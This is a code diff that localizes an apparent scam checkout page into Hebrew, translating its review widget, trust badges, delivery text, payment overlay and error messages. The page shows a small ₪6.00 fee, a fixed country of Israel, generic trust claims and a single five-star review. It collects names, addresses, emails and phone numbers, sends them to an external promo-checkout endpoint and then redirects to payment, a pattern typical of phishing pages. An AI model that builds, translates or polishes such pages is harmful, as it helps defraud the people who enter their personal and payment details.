@@ -94,7 +94,7 @@ animation:loadingBar 2.2s ease-in-out infinite}
 sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 </script>
 
-<div class="safe">Secure SSL Checkout</div>
+<div class="safe">תשלום מאובטח SSL</div>
 
 <div class="wrap">
 
@@ -102,7 +102,7 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 <span>תשלום מאובטח 🔒</span>
 <div>
 <span class="stars">★★★★★</span>
-<span class="reviews">(2,777 reviews)</span>
+<span class="reviews">(2,777 חוות דעת)</span>
 </div>
 </div>
 
@@ -135,7 +135,7 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 
 <div class="form-grid">
 <input id="emailInput" class="input" type="email" placeholder="אימייל" required style="text-align:left; direction:ltr;">
-<input class="input" value="Israel" disabled style="text-align:right;">
+<input class="input" value="ישראל" disabled style="text-align:right;">
 </div>
 
 <div class="form-grid">
@@ -155,32 +155,32 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 <aside>
 
 <div class="widget">
-<div style="text-align:center;font-weight:800">Customer Reviews</div>
-<div style="text-align:center;font-weight:700;">Fenella Lara</div>
+<div style="text-align:center;font-weight:800">חוות דעת לקוחות</div>
+<div style="text-align:center;font-weight:700;">פנלה לארה</div>
 <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-<p style="text-align:center">I received my product yesterday. Great experience!</p>
+<p style="text-align:center">קיבלתי את המוצר שלי אתמול. חוויה מעולה!</p>
 </div>
 
 <div class="widget">
 <div class="delivery">
 <img id="sidebarImg" style="width:52px;height:52px;border-radius:8px;border:1px solid var(--line);display:none">
 <div>
-<div style="font-weight:800">Fast Delivery</div>
-<div class="sub">3–5 working days</div>
+<div style="font-weight:800">משלוח מהיר</div>
+<div class="sub">3–5 ימי עסקים</div>
 </div>
-<div style="margin-left:auto;font-weight:800">Free</div>
+<div style="margin-left:auto;font-weight:800">חינם</div>
 </div>
 
-<div style="margin-top:14px;font-weight:800">Order Summary</div>
-<div class="order-row"><span>Total</span><span>₪6.00</span></div>
+<div style="margin-top:14px;font-weight:800">סיכום הזמנה</div>
+<div class="order-row"><span>סה"כ</span><span>₪6.00</span></div>
 </div>
 
 <div class="widget">
-<div style="font-weight:800;margin-bottom:10px">Why Trust Us</div>
+<div style="font-weight:800;margin-bottom:10px">למה לבחור בנו</div>
 <div class="trust">
-<div class="box"><div>⭐</div><div>99% positive reviews</div></div>
-<div class="box"><div>🔒</div><div>SSL Secure</div></div>
-<div class="box"><div>🛡️</div><div>£250,000 Insurance</div></div>
+<div class="box"><div>⭐</div><div>99% חוות דעת חיוביות</div></div>
+<div class="box"><div>🔒</div><div>SSL מאובטח</div></div>
+<div class="box"><div>🛡️</div><div>ביטוח מלא</div></div>
 </div>
 </div>
 
@@ -191,9 +191,9 @@ sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
 
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
 <div class="loading-box">
-<div class="loading-title">Processing payment…</div>
+<div class="loading-title">מעבד תשלום…</div>
 <div class="progress-wrap"><div class="progress-bar"></div></div>
-<p class="sub" style="margin-top:10px">Please wait a few seconds…</p>
+<p class="sub" style="margin-top:10px">אנא המתן מספר שניות…</p>
 </div>
 </div>
 
@@ -267,13 +267,13 @@ nextBtn.onclick = async () => {
   nameInput.value = `${firstName.value} ${lastName.value}`.trim();
 
   if (!firstName.value || !lastName.value || !billingStreet.value || !billingPostcode.value || !billingCity.value || !emailInput.value || !phoneNumber.value) {
-    alert("Please complete all required fields.");
+    alert("נא למלא את כל השדות הנדרשים.");
     return;
   }
 
   try {
     nextBtn.disabled = true;
-    nextBtn.textContent = "Creating secure checkout…";
+    nextBtn.textContent = "מייצר קישור מאובטח…";
     overlay.setAttribute("aria-hidden", "false");
 
     const response = await fetch("https://www.speaktoheaven.com/api/create-promo-checkout-link", {
@@ -310,7 +310,7 @@ nextBtn.onclick = async () => {
     const data = await response.json();
 
     if (!response.ok || !data.url) {
-      throw new Error(data.error || "Could not create secure checkout link.");
+      throw new Error(data.error || "לא ניתן ליצור קישור לתשלום מאובטח.");
     }
 
     let nextUrl =
@@ -331,8 +331,8 @@ window.location.href = nextUrl;
   } catch (error) {
     overlay.setAttribute("aria-hidden", "true");
     nextBtn.disabled = false;
-    nextBtn.textContent = "Continue";
-    alert(error.message || "Could not open secure checkout. Please try again.");
+    nextBtn.textContent = "המשך";
+    alert(error.message || "שגיאה בחיבור לעמוד התשלום. נא לנסות שוב.");
   }
 };
 
